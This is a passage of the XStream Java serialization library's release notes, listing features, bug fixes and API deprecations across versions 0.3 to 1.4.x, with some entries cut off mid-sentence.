* [XSTR-729](/jira/729): Add OSGi information to manifests.
* [XSTR-723](/jira/723): XStream will now detect a working enhanced mode dynamically instead using lists of known
  vendors. This allows enhanced support for JamVM if it is bundled with OpenJDK. It will currently fail on a runtime
  based on GNU Classpath (at least up to version 0.98).

# 1.4.3

Released July 17, 2012.

## Major changes

* Support java.util.concurrent.ConcurrentHashMap with the MapConverter. This will also avoid a bug in JRockit
  JDK reported in [XSTR-608](/jira/608).
* [XSTR-699](/jira/699): Support for Hibernate 4 with XStream's Hibernate module as default for Java 6 or higher.

## Minor changes

  c.t.x.converters.reflection.ObjectAccessException and used instead when the unmarshalling process should write a
  field or property that is missing and does not exist.
* Added methods c.t.x.io.path.PathTracker.peekElement(), c.t.x.io.path.PathTracker.peekElement(int), and
  c.t.x.io.path.PathTracker.depth().
* Deprecated method c.t.x.core.ReferencingMarshallingContext.currentPath(). Wrong approach.

# 1.4.1

Released August 11, 2011.

## Major changes

* [XSTR-659](/jira/659): Use again Xpp3 as default parser, now with additional XmlPullParser API as regular dependency
  for the XPP factory. Only standard kXML2 package contains the XPP factory, but not the minimal kXML2 version.

## Minor changes

* Add utility class c.t.x.io.xml.xppdom.XppFactory and a path tracking comparator for XppDom.

# 1.4

Released August 6, 2011.

## Major changes

* Java 7 is detected and supported.
* [XSTR-542](/jira/542): The XppDriver uses now the official XmlPullParser API to locate an available parser using the

* [XSTR-553](/jira/553): Support annotations in Android.
* [XSTR-556](/jira/556): DateConverter uses format with 3-letter time zones that are ambiguous. Therefore it will now
  always use UTC to write dates. Unmarshalled dates are not affected as long as they contain a time zone.
* The type java.lang.reflect.Field is now handled by an own converter, that can still read the old format.
* [XSTR-490](/jira/490): Provide path in Converter for contexts that track the path.

  representation of an enum value.
* [XSTR-618](/jira/618): Add Oracle as vendor used for recent JRockit versions and former Sun JDK.

# 1.3.1

Released December 6, 2008.

CGLIB support must be explicitly activated now. The decision has been made due to possible
problems using an own classloader and because of ongoing complaints about occurring exceptions in the
CGLIBEnhancedConverter at XStream initialization although they are caused by incompatible ASM versions on the user's
classpath ([XSTR-469](/jira/469), [XSTR-513](/jira/513) and [XSTR-518](/jira/518)).

XStream uses some attributes on its own. Until now it was possible to use
XStream.aliasAttribute to define a different name. This does still work but is deprecated for system attributes. Use
the new call XStream.aliasSystemAttribute for such an alias.

## Major changes

* [XSTR-515](/jira/515): CGLIB support is no longer activated automatically and has to be [explicitly turned on](faq.html#Serialization_CGLIB).

* [XSTR-497](/jira/497): Unsafe operation with WeakHashMap can raise a NPE in Sun14ReflectionProvider.
* [XSTR-423](/jira/423): Support of CGLIB enhanced proxies with multiple callbacks if the proxy uses a factory (CGLIB
  default).
* [XSTR-536](/jira/536): XStream silently ignores unknown elements.
* [XSTR-503](/jira/503): Omitted properties in JavaBeans are requested at serialization (by Kevin Conaway).

  amd64 system).
* [XSTR-480](/jira/480): Aliasing of array types.
* [XSTR-515](/jira/515): The SubjectConverter and DurationConverter are only registered if the converted class is part
  of the JDK, otherwise they must be registered now explicitly.

* [XSTR-529](/jira/529): NullPointerException for null elements in implicit lists.
* [XSTR-517](/jira/517): Miscellaneous performance improvements (by Tatu Saloranta).
* [XSTR-525](/jira/525): JsonHierarchicalStreamDriver writes invalid JSON in case of system attribute.
* [XSTR-535](/jira/535): Mode to allow plain values as result for JSON without root node.
* [XSTR-531](/jira/531): Possibility to omit system attributes.
* [XSTR-508](/jira/508): Fix marshalling error for nested serializable objects with own writeReplace/readResolve
  methods.
* [XSTR-507](/jira/507): Advanced ReferenceByIdMarshaller uses id of the current object if available.

* Dependencies have been updated to latest versions of JDOM, Jettison, Joda Time, and Woodstox. Note for Maven
  builds that the *groupId* of JDOM has changed.
* Fix possible IndexOutOfBoundsException creating returning the message for a ConversionException.
* [XSTR-495](/jira/495): StreamStrategy cannot handle key with value *null*.

## API changes

* Deprecated c.t.x.io.json.JsonHierarchicalStreamWriter in favour of c.t.x.io.json.JsonWriter.
* c.t.x.mapper.EnumMapper no longer derives from the c.t.x.mapper.AttributeMapper as it has been before version
  1.3. Therefore the new constructor has been deprecated in favour of the old one.
* c.t.x.mapper.Mapper.getConverterFromAttribute(Class, String) has been deprecated in favour of
  c.t.x.mapper.Mapper.getConverterFromAttribute(Class, String, Class) taking the type as third argument that should be
  handled by the converter.
* c.t.x.core.ReferenceByIdMarshaller.IdGenerator.next() has now the current object as argument.
* New c.t.x.persistence.PersistenceStrategy and c.t.x.persistence.FilePersistenceStrategy.
* Deprecated c.t.x.persistence.StreamStrategy and c.t.x.persistence.FileStreamStrategy.

* Refactoring of Annotation support, invent auto-detection mode.
* Annotated converters are no longer detected automatically, all annotations are now handled in the same way.
* [XSTR-334](/jira/334): XStream will deserialize directly from a file or URL. Some parser take advantage of these
  objects to define a SystemId used to resolve further references in XML, schema or DTD. Appropriate createReader
  methods have been added to c.t.x.io.HierarchicalStreamDriver.
* [XSTR-261](/jira/261): All c.t.x.io.HierarchicalStreamDriver implementations respect now the encoding of an XML
  header if read from an InputStream.
* DomDriver does no longer use explicitly UTF-8 by default, DomReader will therefore respect the encoding
  defined in the XML header or use native encoding
* [XSTR-415](/jira/415): JavaBeanConverter uses now BeanIntrospection (by Hinse ter Schuur).
* [XSTR-424](/jira/424): DateConverter uses now by default SimpleDateFormat instances in non-lenient mode.

## API changes

* c.t.x.annotation.Annotations, c.t.x.annotation.AnnotationReflectionConverter and
  c.t.x.annotation.AnnotationProvider deprecated. Functionality is integrated in new c.t.x.mapper.AnnotationMapper and
  accessible with new methods c.t.x.XStream.processAnnotations().
* New auto-detection mode for annotations, that can be turned on with c.t.x.XStream.autodetectAnnotations()
* c.t.x.annotation.@XStreamContainedType deprecated, the behaviour is now always active and the annotation
  therefore superfluous.
* Due to [XSTR-421](/jira/421) null characters are no longer written as tag with an attribute (<char
  null="true"/>), but as empty tag. The old representation is still supported at deserialization.
* Characters that are not defined in unicode or ISO control characters (expect TAB and LF) are written as
  numerical entity now.
* XPath references are now also XML-friendly encoded to match the path exactly. Unencoded references will
  normally work anyway, but in special cases the exact behaviour of XStream 1.2.x might be necessary. See acceptance
  tests for XStream 1.2.x compatibility.
* c.t.x.core.BaseException deprecated in favour of c.t.x.XStreamException as base exception for all exceptions
  XStream throws.
* c.t.x.XStream.InitializerException deprecated in favour of c.t.x.InitializerException.
* New methods get() and keys() in interface c.t.x.converter.ErrorWriter.
* c.t.x.mapper.XmlFriendlyMapper deprecated, technology is replaced since version 1.2 by
  c.t.x.io.xml.XmlFriendlyReplacer as part of the different XmlWriter implementations.
* c.t.x.mapper.Mapper.aliasForAttribute() and c.t.x.mapper.Mapper.attributeForAlias() deprecated, since it
  provided in reality the combined functionality of c.t.x.mapper.Mapper.serializedMember()/realMember() and
  c.t.x.mapper.Mapper.getConverterFromItemType().
* c.t.x.XStream(ReflectionProvider, Mapper, HierarchicalStreamDriver) deprecated, in favour of
  c.t.x.XStream(ReflectionProvider, HierarchicalStreamDriver, Mapper, ClassLoader).
* New interface c.t.x.converter.ConverterRegistry to express explicit functionality managing the converters.
* c.t.x.core.DefaultConverterLookup no longer uses a c.t.x.mapper.Mapper. Therefore the old constructor has
  been deprecated in favour of a default constructor.
* Overloaded methods of c.t.x.mapper.Mapper.getConverterFromItemType and
  c.t.x.mapper.Mapper.getConverterFromAttribute have been deprecated. Only one version has been kept, the
  implementation can handle all cases now at once and therefore multiple calls to the mapper chain are avoided.
* c.t.x.mapper.EnumMapper derives now from the c.t.x.mapper.AttributeMapper to support enums as attributes.
  Therefore the old constructor has been deprecated in favour of one taking an additional
  c.t.x.converters.ConverterLookup that has to be passed to the new parent.

Note, to support a representation of null values in some way, it is absolutely necessary that
each converter can handle a null value in its marshalling methods. If you have implemented your own custom converters,
try to handle such a case also to prevent incompatibilities in case XStream will provide such values with its next
major version.

# Version 1.2.2

Released May 24, 2007.

Note, that next version of XStream will behave slightly different by default. XStream emits
all fields in declaration order like Java serialization. But in contrast to Java it will omit the fields of parent
classes last while Java serialization emits them first. This makes it difficult to match a given XML schema that
defined inherited types or leads sometimes to obscure initialization problems. However, XStream itself will not be
affected by the changed order of elements in the XML, any deserialization of current XML representations will work
fine. Anyway we will provide with XStream 1.3 a FieldKeySorter implementation that mimics the old behaviour. In the
meanwhile you can enforce the new field sorting by installing the NaturalFieldKeySorter.

## Major changes

* [XSTR-391](/jira/391), Support for writing (and reading) JSON by the new JettisonMappedXmlDriver (by Dejan Bosanac).
* New FieldKeySorter interface allows a custom sort order of the XML elements.

  Nicolas Gros d'Aillon).
* Support raw bytes read from the ObjectInputStream.
* [XSTR-373](/jira/373), Support for Hitachi JVM (tested by Yuji Yamano).
* [XSTR-378](/jira/378) and [XSTR-379](/jira/379), Fix TextAttributeConverter and EnumSetConverter failing on Apache Harmony.

  by Andrea Aime).
* Ability to alias fields as well as classes, using XStream.addFieldAlias().
* [XSTR-70](/jira/70), [XSTR-204](/jira/204) Support for JDK 5 enums (contributed by Eric Snell and Bryan Coleman).
* [XSTR-206](/jira/206) Clean representation of JDK 5 EnumMap and EnumSet.

  HierarchicalStreamReader/Writer instances.

# Version 1.1.1

Released March 7, 2005. Mostly bugfixes and minor feature enhancements.

## Major changes

* Converters can be registered with a priority, allowing more *generic* filters to handle classes that
  don't have more specific converters.
* Converters can now access underlying HierarchicalStreamReader/Writer implementations to make implementation
  specific calls.
* Improved support for classes using ObjectInputFields to follow the serialization specification.
* [XSTR-179](/jira/179) Support for ObjectInputStream.registerValidation(ObjectInputValidation).
* [XSTR-178](/jira/178) Serialized inner class now maintains reference to outer class.

* Bugfix: Default implementations of aliased classes were not being deserialized by SerializableConverter.
* Bugfix: [XSTR-180](/jira/180) Serializable objects support defaultReadObject() even when no default fields available.
* Bugfix: For serialized objects class hierarchy is serialized starting with superclass (as per Java Object
  Serialization).
* Bugfix: readObject() is now called for classes containing only transient fields.
* Bugfix: Order of fields are maintained when calling ObjectOutputStream.putFields().
* Bugfix: FontConverter extended to support FontUIResource which does some awkward native calls.
* Bugfix: Deserialization of very complicated graphs (such as Swing components) sometimes resulted in broken
  object references. Now fixed.
* Bugfix: [XSTR-188](/jira/188) Classes that use readResolve()/writeReplace() can now return different types.
* Bugfix: [XSTR-185](/jira/185), [XSTR-195](/jira/195) Support for loading of array classes for classes that have not yet been
  loaded. (Thanks to Henri Tremblay and Simon Daniel)

# Version 1.1

Released January 15, 2005. Focus on support for objects defining custom serialization using the standard [Java serialization](http://java.sun.com/j2se/1.4.2/docs/guide/serialization/spec/serialTOC.html) mechanism.

## Major changes

* Provides drop in replacement for ObjectInputStream and ObjectOutputStream, using
  XStream.createObjectInputStream() and XStream.createObjectOutputStream() and XStream.createObjectInputStream(). This
  provides support for streaming objects.
* Support for objects that specify their own serialization schemes by implementing readObject() and
  writeObject() (as in Java serialization spec). This includes support for ObjectInputStream.getFields() and
  ObjectOuputStream.putFields().
* Support for objects to serialize other objects to the stream by implementing writeReplace() (as in Java
  serialization spec).
* Support for any object that performs custom serialization by implementing java.io.Externalizable (as in Java
  serialization spec).
* Implicit collections can be specified for classes, allowing the element wrapping the collection to be
  skipped.
* New writer implementations to allow XStream to serialize directly to a SAX stream or TrAX pipeline.
* The MarshallingContext and UnmarshallingContext interfaces now extend DataHolder, allowing arbitrary data to
  be stored by the user whilst walking the object graph and passed around to Converters. DataHolders can also be passed
  into XStream from the outside.
* Includes new DomWriter implementation to serialize directly to a W3C DOM tree (to complement the existing
  DomReader).
* Better support for instantiating objects on non Sun 1.4+ JVMs, including non-public constructors, private
  static inner classes and ANY class that implements java.io.Serializable.
* DOM, DOM4J, JDOM, XOM, Electric-XML, SAX, STAX
* Specific ClassLoaders can be passed into XStream, to allow for greater compatibility in J2EE containers.
* Ability to change the default converter
* Added optional ISO8601DateConverter for full ISO8601 date format support. The converter is not registered by
  default as it requires the joda-time dependency (http://joda-time.sf.net). To use, ensure joda-time is in classpath
  and register explicitly.
* Enhanced mode is now supported on the Apple 1.4 JDK.

## Minor changes

* PrettyPrintWriter only flushes stream when necessary - large performance improvement for serialization.
* Added XStream.fromXml(xml, root) convenience methods for deserializing into an existing root object.
* JDK 1.3 compatibility: Added mechanism for accessing nested exception.
* JDK 1.3 compatibility: GregorianCalendarConverter only calls Calendar.getTimeInMillis() the JDK supports it.
* Bugfix: All caches are now synchronized - there were some thread safety issues.
* Bugfix: Only *immutable* basic types will have references ignored in XML (for clarity).
* Bugfix: Class names can contain underscores.
* Bugfix: Support for '\0' char.
* Bugfix: PropertyConverter no longer attempts to serialize subclasses of Properties.
* Bugfix: JVM detection uses system properties, which is more accurate than searching the classpath.

## API changes

* XStream.addDefaultCollection() has been deprecated. Use XStream.addImplicitCollection() instead.

# Version 1.0.2

Released August 7, 2004. Focus on improving the converters bundled with XStream to support a wider range of
types.

## Major changes

* XML elements are written in order they are defined in class, rather than alphabetical.
* Converters for java.io.File, java.sql.Timestamp, java.awt.Color, and dynamic proxies are now registered by
  default.
* EncodedByteArrayConverter is now registered by default and uses a single Base64 string to store the contents
  of a byte[]. This now works on all JVMs as it no longer relies on Sun specific classes. This converter will also
  unmarshal byte[] that have been serialized without it, for backwards compatability.
* New converters for java.sql.Time, java.sql.Date, java.util.Locale, java.util.Currency, java.util.Calendar and
  java.awt.Font.
* All caching is done in XStream instance instead of statics, allowing applications that use hot redeployment
  of classes to use XStream in a parent classloader.
* XStream will fail fast if a field value is defined more than once in XML when deserializing.

## Minor changes

* The <entry> element used in Maps can now be specified by creating an alias for java.util.Map.Entry.
* Bugfix: Fields with characters that generate invalid XML (such as $ signs) are now escaped.
* Bugfix: Pre-instantiated objects can be unmarshalled through multiple levels.

## API changes

* None.

# Version 1.0.1

Released May 30, 2004. Misc features and bugfixes.

## Major changes

* Support for multidimensional arrays.
* Object with readResolve() method will be treated the same way native serialization treats them.

## Minor changes

* New converters for Throwable and StackTraceElement that retain stack trace (JDK 1.4 only)
* Bugfix: System.identityHashCode() is not guaranteed to be unique. Ensure reference checking is used as well.
* Bugfix: Allows user classes to be defined in WEB-INF/classes in Servlet environments. Tries to use context
  classloader if available.
* Support for java.util.Currency (through readResolve()).
* Instances of Jakarta Commons Lang Enum are now reused (through readResolve()).
* Bugfix: JavaClassConverter handles primitive type classes (contributed by Matthew Sandoz).

## API changes

* Additional method: ConverterLookup.defaultConverter(). Custom implementations of this class should implement
  this new method.

# Version 1.0

Released May 14, 2004. Focusses on finalizing the API for 1.0 release.

## Major changes

* Supports fields of same name, hidden by inheritance.

## Minor changes

* JavaDoc for most important parts of API.

## API changes

* The ReflectionConverter and ReflectionProviders have had an overhaul to support hidden fields. Most methods
  now take an extra argument to specify which class a field is declared in.

# Version 1.0 (release candidate 1)

Released May 9, 2004. Focusses on finalizing the API for 1.0 release.

## Major changes

* JDK 1.3 compatibility.
* Informative error messages.
* Defaults to using faster XPP based parser.
* Serializes final field under JDK 1.4.
* Fail fast when trying to serialize final field if not Sun 1.4 JRE.

## Minor changes

* Misc performance improvements.
* Converters for TreeMap and TreeSet that store the Comparator.

## API changes

* Default constructor for XStream class uses XppDriver instead of DomDriver. To use DomDriver, explicitly pass
  it in to the constructor.
* Exception is thrown if trying to serialize an object that contains a final field if not Sun 1.4 JRE.

# Version 0.6

Released May 7, 2004. Focusses on providing full object graph support.

## Major changes

* None.

## Minor changes

* Bugfix: Objects that had no children could not be derefenced properly (thanks to Brian Slesinsky and Nick
  Pomfret).
* Bugfix: DateConverter is now thread safe.
* Optimization: String instances are reused as much as possible.
* Converters for BigInteger and BigDecimal.
* IntConverter now recognises hexadecimal and octal notations (thanks to Konstantin Pribluda).

## API changes

* None.

# Version 0.6 (release candidate 1)

Released April 19, 2004. Focusses on providing full object graph support.

## Major changes

* Full support for object graphs, including duplicate references of same object and circular references.
* References can be identified using XPath (default), unique-IDs or disabled.

## Minor changes

* Release includes Ant build file.
* Converters for non standard collections such as Collections.EMPTY\_LIST, syncronizedList(), unmodifiableMap(),
  etc.
* Converter for nulls.
* Converter for dynamic proxies.
* Converter for java.net.URL.
* Converters for java.util.LinkedHashMap and java.util.LinkedHashSet.
* Converters for java.lang.reflect.Method and java.lang.reflect.Constructor.
* If duplicate reference support is disabled and a circular reference is encountered, an exception will be
  thrown.

## API changes

* None.

# Version 0.5

Released March 8, 2004. Focussed on performance.

## Major changes

* Massive performance improvements. Up to 3 times faster for serialization and 22 times faster for
  deserialization!
* Non-DOM building pull parser based reader. Results in much smaller memory footprint, particularly when
  deserializing large object models.

## Minor changes

* Misc performance improvements.
* Misc bugfixes.
* Alternate encodings can be used with DomDriver.

## API changes

* Renamed XMLReader/Writer to HierarchicalStreamReader/Writer as XStream is not actually coupled to serializing
  just to XML.
* Cleaned up the public API.
* Moved internal XStream implementation classes to core package.
* Misc package/class renames to make more sense. Dumped lots of dead code.

# Version 0.4

This version was never publicly released. All changes were made available in 0.5. Focussed on making it easier
to create custom converters.

## Major changes

* Overhaul of interface for Converters. Makes Converters much cleaner to write.

## Minor changes

* Added custom converters for java.io.File, java.util.Properties, java.util.Vector, java.util.Hashtable,
  java.util.BitSet byte[] (Base64 encoded), char[].
* Misc bugfixes.

## API changes

* New interface to be implemented by custom converters.

# Version 0.3

Released January 1, 2004.

## Major changes

* Added ElementMapper interface and default implementations to allow fine grained control over element name to
  class mapper operations.
* Added an XPP based reader and writer that uses a pull-parser to create a lightweight DOM tree.

## Minor changes

* Added XStream.fromXML(XMLReader xmlReader,Object root) method to allow the population of an object graph
  starting with a live object root.
* Added XMLReader.peek() method to allow access to the underlying hierarchical object being unmarshalled.

## API changes

* Aligned the the methods in XStream to use the specified ObjectFactory in the constructor instead of creating
  a SunReflectionObjectFactory.
